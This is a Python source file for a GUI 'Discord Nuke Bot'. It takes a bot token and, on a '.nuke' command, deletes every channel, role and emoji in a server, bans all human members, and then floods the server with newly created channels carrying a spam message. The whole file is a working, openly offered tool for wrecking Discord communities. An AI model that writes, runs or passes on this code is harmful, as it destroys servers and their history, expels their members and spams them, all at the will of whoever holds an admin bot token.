import discord
from discord.ext import commands
import asyncio
import threading
import tkinter as tk
import ttkbootstrap as tb
from ttkbootstrap.constants import *
from tkinter import messagebox
from tkinter import scrolledtext

# ====================== GLOBAL VARIABLES ======================
bot_token = ""
spam_message = "💥 SERVER NUKED BY BOSS 💥"
spam_amount = 100
bot = None
loop = None
bot_thread = None

# ====================== DISCORD BOT SETUP ======================
intents = discord.Intents.all()
bot_running = False

# ====================== GUI CALLBACKS ======================
def start_bot():
    global bot, loop, bot_thread, bot_token, spam_message, spam_amount, bot_running

    if bot_running:
        messagebox.showwarning("Already Running", "The bot is already running.")
        return

    bot_token = token_entry.get().strip()
    spam_message = message_entry.get().strip()
    spam_amount = int(amount_entry.get().strip() or 100)

    if not bot_token:
        messagebox.showerror("Missing Token", "Please enter a valid bot token.")
        return

    def run_bot():
        global bot, loop, bot_running
        bot_running = True
        bot = commands.Bot(command_prefix=".", intents=intents)

        @bot.event
        async def on_ready():
            log("Bot is online!")

        @bot.command()
        async def nuke(ctx):
            guild = ctx.guild
            await ctx.send("Nuking server...")

            await asyncio.gather(
                delete_all_channels(guild),
                delete_all_roles(guild),
                delete_all_emojis(guild),
                ban_all_members(guild)
            )

            await spam_channels(guild)
            await ctx.send("Nuke complete!")

        async def delete_all_channels(guild):
            for channel in list(guild.channels):
                try:
                    await channel.delete()
                    log(f"Deleted channel: {channel.name}")
                except Exception as e:
                    log(f"Failed to delete channel {channel.name}: {e}")

        async def delete_all_roles(guild):
            for role in guild.roles:
                if role < guild.me.top_role and role != guild.default_role:
                    try:
                        await role.delete()
                        log(f"Deleted role: {role.name}")
                    except Exception as e:
                        log(f"Failed to delete role {role.name}: {e}")

        async def delete_all_emojis(guild):
            for emoji in guild.emojis:
                try:
                    await emoji.delete()
                    log(f"Deleted emoji: {emoji.name}")
                except Exception as e:
                    log(f"Failed to delete emoji {emoji.name}: {e}")

        async def ban_all_members(guild):
            for member in guild.members:
                if not member.bot:
                    try:
                        await member.ban(reason="Nuked")
                        log(f"Banned member: {member.name}")
                    except Exception as e:
                        log(f"Failed to ban {member.name}: {e}")

        async def spam_channels(guild):
            for i in range(spam_amount):
                try:
                    channel = await guild.create_text_channel(f"nuked-{i}")
                    await channel.send(spam_message)
                    log(f"Created and spammed channel: {channel.name}")
                except Exception as e:
                    log(f"Failed to spam channel {i}: {e}")

        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            loop.run_until_complete(bot.start(bot_token))
        except Exception as e:
            log(f"Bot error: {e}")
            bot_running = False

    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()

def stop_bot():
    global bot, loop, bot_running
    if bot_running and bot:
        asyncio.run_coroutine_threadsafe(bot.close(), loop)
        log("Bot stopped manually.")
        bot_running = False
    else:
        log("Bot is not running.")

def log(message):
    log_output.insert(tk.END, f"{message}\n")
    log_output.see(tk.END)

# ====================== GUI SETUP ======================
app = tb.Window(themename="darkly")
app.title("Discord Nuke Bot GUI")
app.geometry("600x500")

style = tb.Style()

# === Title ===
tb.Label(app, text="💣 Discord Nuke Bot", font=("Segoe UI", 20, "bold"), bootstyle="danger").pack(pady=(20, 10))

# === Token Entry ===
tb.Label(app, text="Bot Token:", bootstyle="info").pack(anchor="w", padx=20)
token_entry = tb.Entry(app, width=60, show="*")
token_entry.pack(padx=20, pady=5)

# === Message Entry ===
tb.Label(app, text="Spam Message:", bootstyle="info").pack(anchor="w", padx=20)
message_entry = tb.Entry(app, width=60)
message_entry.insert(0, spam_message)
message_entry.pack(padx=20, pady=5)

# === Amount Entry ===
tb.Label(app, text="Spam Amount:", bootstyle="info").pack(anchor="w", padx=20)
amount_entry = tb.Entry(app, width=20)
amount_entry.insert(0, str(spam_amount))
amount_entry.pack(padx=20, pady=5)

# === Buttons ===
button_frame = tb.Frame(app)
button_frame.pack(pady=10)
tb.Button(button_frame, text="Start Bot", bootstyle="success", command=start_bot).pack(side="left", padx=10)
tb.Button(button_frame, text="Stop Bot", bootstyle="danger", command=stop_bot).pack(side="left", padx=10)

# === Log Output ===
log_output = scrolledtext.ScrolledText(app, height=15, font=("Consolas", 10))
log_output.configure(background="#121212", foreground="#00ffae", insertbackground="white", borderwidth=0, relief="flat")
log_output.pack(padx=20, pady=(10, 0), fill="x")

# ====================== RUN GUI ======================
app.mainloop()
